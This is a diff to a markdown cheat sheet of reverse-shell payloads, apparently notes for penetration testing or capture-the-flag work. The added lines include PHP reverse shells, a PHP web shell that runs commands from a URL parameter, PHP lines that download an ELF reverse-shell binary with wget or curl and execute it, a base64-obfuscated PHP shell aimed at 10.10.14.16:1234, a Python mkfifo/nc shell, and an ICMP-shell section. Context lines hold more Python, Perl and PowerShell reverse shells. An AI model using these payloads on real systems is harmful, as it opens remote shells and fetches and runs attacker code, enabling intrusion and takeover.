@@ -101,10 +101,25 @@ ncat -nv $target $source_port --ssl
 php -r '$sock=fsockopen("$source_ip",$source_port);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 ```php
+<?php $sock=fsockopen("$source_ip",$source_port);exec("/bin/bash -i <&3 >&3 2>&3");?>
+```
+```php
 <?php system($_GET["cmd"]); ?>
+```
+```php
+<?php system("wget http://$source_ip/public/payloads_linux/shell_reverse_tcp_x86.elf -O /tmp/shell.elf; chmod +x /tmp/shell.elf; /tmp/shell.elf"); ?>
+```
+```php
+<?php system("curl http://$source_ip/public/payloads_linux/shell_reverse_tcp_x86.elf > /tmp/shell.elf; chmod +x /tmp/shell.elf; /tmp/shell.elf"); ?>
+```
+```php
+<?php system("echo \"PD9waHAgPWZzb2Nrb3BlbigiMTAuMTAuMTQuMTYiLDEyMzQpO2V4ZWMoIi9iaW4vYmFzaCAtaSA8JjMgPiYzIDI+JjMiKTs/Pgo=\" | base64 -d > /tmp/shell.php; php /tmp/shell.php"); ?>
 ```
 ```bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$source_ip",$source_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+```python
+import os;​ os.popen("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $source_ip $source_port >/tmp/f &").read()​
 ```
 ```bash
 perl -e 'use Socket;$i="$source_ip";$p=$source_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
@@ -151,3 +166,12 @@ stty rows 38 columns 116
 ```
 
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.8 -Port 9999
+
+## ICMP Shells
+
+Disable ICMP replies:
+```bash
+sysctl -w net.ipv4.icmp_echo_ignore_all=1
+```
+- Listener/Server - <https://github.com/inquisb/icmpsh>
+- Sender/Client - <https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1>
